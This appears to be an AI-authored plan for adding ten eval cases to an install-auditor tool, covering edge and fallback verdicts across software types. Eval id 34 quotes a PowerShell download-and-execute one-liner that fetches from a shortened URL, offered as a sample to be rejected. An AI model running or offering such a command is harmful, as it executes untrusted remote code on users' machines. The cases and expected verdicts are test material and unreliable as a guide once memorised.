# Per-Workflow Eval Bundles (M6.1)

> **Status:** Complete
> **Created:** 2026-04-17
> **Completed:** 2026-04-17
> **Author:** Claude (plan-projex)
> **Source:** Phase 6 M6.1 of subject-typed redesign nav
> **Nav:** 2604070218-install-auditor-subject-typed-redesign-nav.md
> **Related Projex:** 2604070218-install-auditor-subject-typed-redesign-nav.md (Phase 6), 2604070217-subject-typed-audit-dispatch-eval.md
> **Walkthrough:** 2604171500-per-workflow-eval-bundles-m61-walkthrough.md
> **Worktree:** No

---

## Summary

Expand `evals/evals.json` so every workflow file has >=3 eval cases covering positive (Tier 1 APPROVED), negative (Tier 3 REJECTED), and edge (CONDITIONAL or unusual-input) scenarios. Currently 8 of 10 workflows fall short: 7 workflows have exactly 2 cases (positive + negative, missing edge), and `generic.md` has 0. Plan adds 10 new eval cases (ids 26-35).

**Scope:** `evals/evals.json` only — no workflow or skill file changes.
**Estimated Changes:** 1 file, 10 new eval entries.

---

## Objective

### Problem / Gap / Need

Phase 4 closed with 2 evals per workflow (except registry-package with 9, browser-extension with 3). M6.1 requires >=3 per workflow to catch regressions on edge-case routing, tier assignment, and verdict logic. The `generic.md` fallback has zero eval coverage — a regression there would be invisible.

### Success Criteria

- [ ] Every workflow file in `workflows/` has >=3 eval cases in `evals/evals.json`
- [ ] Each workflow's eval set includes at least one positive, one negative, and one edge case
- [ ] All new evals have valid JSON structure matching existing schema (id, prompt, expected_output, files, assertions)
- [ ] Existing evals (ids 0-25) unchanged
- [ ] Total eval count reaches 36

### Out of Scope

- Hybrid-subject eval cases (M6.2)
- Workflow file modifications
- Eval runner tooling or automation
- Stewardship cadence (M6.3)

---

## Context

### Current State

26 evals in `evals/evals.json`. Coverage per workflow:

| Workflow | Eval IDs | Count | Has Pos | Has Neg | Has Edge | Gap |
|----------|----------|-------|---------|---------|----------|-----|
| registry-package | 0,2,3,4,5,6,7,8,9 | 9 | Yes | Yes | Yes | None |
| browser-extension | 1,10,11 | 3 | Yes | Yes | Yes | None |
| container-image | 12,13 | 2 | No (T2) | Yes | Yes (T2=edge) | Positive (Tier 1) |
| ci-action | 14,15 | 2 | Yes | Yes | No | Edge |
| ide-plugin | 16,17 | 2 | Yes | Yes | No | Edge |
| desktop-app | 18,19 | 2 | Yes | Yes | No | Edge |
| cli-binary | 20,21 | 2 | Yes | Yes | No | Edge |
| agent-extension | 22,23 | 2 | Yes | Yes | No | Edge |
| remote-integration | 24,25 | 2 | Yes | Yes | No | Edge |
| generic | — | 0 | No | No | No | All 3 |

Existing eval pattern: each case has `id`, `prompt` (user message), `expected_output` (narrative), `files` (usually `[]`), and `assertions` (array of `{text, type}` objects). Types used: `contains_concept`, `exact_match`, `file_exists`, `line_count_max`, `verdict_check`, `contains_string`.

### Key Files

| File | Role | Change Summary |
|------|------|----------------|
| `evals/evals.json` | Eval case registry | Add 10 new entries (ids 26-35) |

### Dependencies

- **Requires:** All 10 workflow files exist (confirmed — Phases 1-4 complete)
- **Blocks:** M6.2 (hybrid-subject evals build on this baseline)

### Constraints

- New eval IDs must be sequential starting from 26 (max existing id is 25)
- Assertion types must use only the 6 types already in use
- Each eval must exercise the full dispatch path: Step 0 classify -> Step 1 workflow load -> Step N verdict
- Edge cases should test CONDITIONAL verdicts or unusual routing scenarios, not just repeat positive/negative patterns

### Assumptions

- The eval schema has no formal JSON Schema — structure is inferred from existing entries
- `generic.md` evals must use prompts that produce low classifier confidence (ambiguous or unclassifiable subjects)
- No eval runner exists yet; evals are validated by structural inspection and manual dry-run

### Impact Analysis

- **Direct:** `evals/evals.json` — 10 new entries appended
- **Adjacent:** None — eval file is read-only reference for validation
- **Downstream:** M6.2 builds on this coverage baseline

---

## Implementation

### Overview

Append 10 new eval objects to the `evals` array in `evals/evals.json`. Seven are edge-case evals (one per under-covered workflow), three are generic.md evals (positive, negative, edge). Each eval specifies a realistic user prompt, expected routing and verdict behavior, and structural assertions.

### Step 1: Add Edge-Case Evals for 7 Workflows (ids 26-32)

**Objective:** Fill the edge-case gap for workflows that have only positive + negative coverage.
**Confidence:** High
**Depends on:** None

**Files:**
- `evals/evals.json`

**Changes:**

Add these 7 eval entries (append to `evals` array before the closing `]`):

**id 26 — container-image positive (Tier 1):**
- Prompt: `"I want to docker pull redis for caching in my local dev environment. Is it safe?"`
- Expected: Tier 1 quick audit. `redis` is a Docker Official Image, well-known, massive adoption. Verdict APPROVED.
- Assertions: subject type is container-image | routes to container-image workflow | Verdict is APPROVED | Docker Official Image recognition | Report saved to .md | `## Audit Coverage`

**id 27 — ci-action edge (CONDITIONAL):**
- Prompt: `"I want to add this GitHub Action to my CI pipeline: uses: docker/build-push-action@v5. It needs write access to packages. Is it safe?"`
- Expected: Tier 2 standard audit. Docker org is verified publisher, but `packages: write` permission is elevated. Verdict CONDITIONAL (pin to SHA, review permissions scope).
- Assertions: subject type is ci-action | routes to ci-action workflow | Verdict is CONDITIONAL | mentions SHA pinning | mentions write permission concern | `## Audit Coverage`

**id 28 — ide-plugin edge (CONDITIONAL):**
- Prompt: `"Should I install the GitLens VS Code extension? It asks for a lot of permissions and wants me to sign in to GitKraken."`
- Expected: Tier 2 standard audit. GitLens is well-known (millions of installs, verified publisher), but freemium model with account requirement raises data-sharing concerns. Verdict CONDITIONAL (review GitKraken privacy policy, optional sign-in).
- Assertions: subject type is ide-plugin | routes to ide-plugin workflow | Verdict is CONDITIONAL or APPROVED | mentions GitKraken account/data concern | `## Audit Coverage`

**id 29 — desktop-app edge (CONDITIONAL):**
- Prompt: `"I want to install OBS Studio for screen recording. The download page offers both the official installer and a Microsoft Store version. Which should I use?"`
- Expected: Tier 2 standard audit. OBS is well-known open-source software, but dual-distribution-channel question is an edge case. Verdict APPROVED or CONDITIONAL. Should recommend official installer or MS Store (both legitimate), note provenance verification.
- Assertions: subject type is desktop-app | routes to desktop-app workflow | Verdict is APPROVED or CONDITIONAL | mentions provenance or distribution channel | `## Audit Coverage`

**id 30 — cli-binary edge (CONDITIONAL):**
- Prompt: `"I want to install terraform from HashiCorp. My company proxy blocks releases.hashicorp.com so a colleague put the binary on a shared network drive. Can I use that copy?"`
- Expected: Tier 2/3 audit. Terraform itself is high-trust, but third-party distribution (shared drive copy) breaks provenance chain. Verdict CONDITIONAL (verify checksum against official SHA256SUMS, or obtain through official channel).
- Assertions: subject type is cli-binary | routes to cli-binary workflow | Verdict is CONDITIONAL | mentions checksum or signature verification | mentions provenance concern | `## Audit Coverage`

**id 31 — agent-extension edge (CONDITIONAL):**
- Prompt: `"I want to add the Brave Search MCP server to my Claude Desktop setup. It says it needs an API key. Is this safe?"`
- Expected: Tier 2 standard audit. Brave Search is a known provider, MCP server is community-maintained. API key requirement means credential exposure surface. Verdict CONDITIONAL (verify MCP server source, review API key scope, ensure key is not logged).
- Assertions: subject type is agent-extension | routes to agent-extension workflow | Verdict is CONDITIONAL or APPROVED | mentions API key / credential concern | `## Audit Coverage`

**id 32 — remote-integration edge (CONDITIONAL):**
- Prompt: `"Our team wants to connect Zapier to our GitHub org to automate issue labeling. Zapier needs repo and org read access. Is this safe?"`
- Expected: Tier 2 standard audit. Zapier is a well-known automation platform, but org-level GitHub access with repo read is broad. Verdict CONDITIONAL (restrict to minimum repos, review Zapier's data retention policy, use fine-grained token).
- Assertions: subject type is remote-integration | routes to remote-integration workflow | Verdict is CONDITIONAL | mentions scope/permission concern | mentions data access breadth | `## Audit Coverage`

**Rationale:** Each edge case targets a realistic CONDITIONAL scenario — the subject is legitimate but has a trust or provenance wrinkle that prevents a clean APPROVED. This exercises the middle path of the verdict tree, which the existing Tier 1 / Tier 3 pairs skip.

**Verification:** JSON validates (`node -e "JSON.parse(require('fs').readFileSync('evals/evals.json'))"`). Each new id is unique. Each assertion references the correct workflow routing.

**If this fails:** Remove the 7 new entries; existing evals are untouched.

---

### Step 2: Add Generic Fallback Evals (ids 33-35)

**Objective:** Create 3 evals for `workflows/generic.md` — the low-confidence fallback path.
**Confidence:** Medium — generic.md triggers on ambiguous prompts, so crafting prompts that reliably produce low classifier confidence requires careful ambiguity.
**Depends on:** None (can run in parallel with Step 1)

**Files:**
- `evals/evals.json`

**Changes:**

**id 33 — generic positive (ambiguous but safe):**
- Prompt: `"My team uses an internal tool called 'buildwatch' that we access through a web portal at buildwatch.internal.company.com. IT says we need to 'install' it but really it's just bookmarking the URL and accepting a browser certificate. Is this safe?"`
- Expected: Low classifier confidence — not a package, extension, container, or app in the traditional sense. Routes to generic.md. Probe phase should clarify: this is a web portal, not a traditional installable. Defensive audit with APPROVED or CONDITIONAL verdict (certificate acceptance is the only trust boundary).
- Assertions: routes to generic.md or low-confidence fallback | mentions classifier uncertainty or low confidence | Report saved to .md | `## Audit Coverage` | Audit confidence

**id 34 — generic negative (ambiguous and risky):**
- Prompt: `"Someone on a forum said I should run this PowerShell one-liner to install a productivity tool: iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup')). Is this safe?"`
- Expected: Low classifier confidence — could be cli-binary, desktop-app, or something else entirely. The shortened URL and `iex` (Invoke-Expression) pattern is a major red flag regardless of subject type. Routes to generic.md. Verdict REJECTED (remote code execution via shortened URL, no provenance, classic attack vector).
- Assertions: routes to generic.md or low-confidence fallback | Verdict is REJECTED | mentions remote code execution or iex risk | mentions shortened URL as red flag | `## Audit Coverage`

**id 35 — generic edge (ambiguous, unclear subject):**
- Prompt: `"I found a GitHub repo that has a Dockerfile, an npm package, AND a VS Code extension all in one monorepo. The README says 'just run make install'. Should I?"`
- Expected: Low classifier confidence — multiple subject types in one repo, no single innermost trust boundary is clear from the prompt alone. Routes to generic.md. Probe phase should ask user to clarify which component they intend to install. Verdict depends on clarification, but report should note the ambiguity and flag the `make install` as requiring review of the Makefile.
- Assertions: routes to generic.md or low-confidence fallback | mentions multiple subject types or ambiguity | mentions need for clarification | Report saved to .md | `## Audit Coverage`

**Rationale:** These three prompts are designed to produce low classifier confidence: id 33 is a non-traditional "install" (web portal), id 34 is an obfuscated script with no clear subject type, id 35 explicitly presents multiple competing subject types. Each tests that the dispatcher correctly falls back to `generic.md` rather than forcing a specific workflow.

**Verification:** Same JSON validation as Step 1. Verify that prompts don't accidentally contain strong signals for any specific subject type (no `npm install`, `docker pull`, `code --install-extension`, etc.).

**If this fails:** Remove the 3 generic entries; existing evals untouched.

---

## Verification Plan

### Automated Checks

- [ ] `node -e "const d=JSON.parse(require('fs').readFileSync('evals/evals.json','utf8')); console.log('Total:',d.evals.length,'IDs:',d.evals.map(e=>e.id).join(','))"` — confirms 36 evals, sequential ids 0-35
- [ ] `node -e "const d=JSON.parse(require('fs').readFileSync('evals/evals.json','utf8')); const ids=d.evals.map(e=>e.id); console.log('Unique:',new Set(ids).size===ids.length)"` — confirms no duplicate ids

### Manual Verification

- [ ] Spot-check each new eval's prompt doesn't contain strong signals for wrong workflow
- [ ] Verify each assertion array includes workflow routing assertion and `## Audit Coverage`
- [ ] Confirm generic evals (33-35) have genuinely ambiguous prompts

### Acceptance Criteria Validation

| Criterion | How to Verify | Expected Result |
|-----------|---------------|-----------------|
| >=3 per workflow | Count evals per workflow type | All 10 workflows at >=3 |
| Positive/negative/edge coverage | Check verdict expectations per workflow | Each has all 3 |
| Valid JSON | Parse evals.json | No errors |
| Existing evals unchanged | Diff ids 0-25 against pre-plan snapshot | Identical |
| Total = 36 | Count evals array length | 36 |

---

## Rollback Plan

1. `git checkout -- evals/evals.json` restores pre-plan state (only one file modified)

---

## Notes

### Risks

- **Classifier sensitivity:** Generic evals (33-35) may route to a specific workflow if the classifier picks up unintended signals. Mitigation: prompts deliberately avoid all strong signal keywords from the Step 0 signal table.
- **Edge-case verdicts:** Some edge cases may produce APPROVED instead of CONDITIONAL depending on model judgment. Mitigation: assertions use `verdict_check` with `CONDITIONAL or APPROVED` where appropriate.

### Open Questions

None.
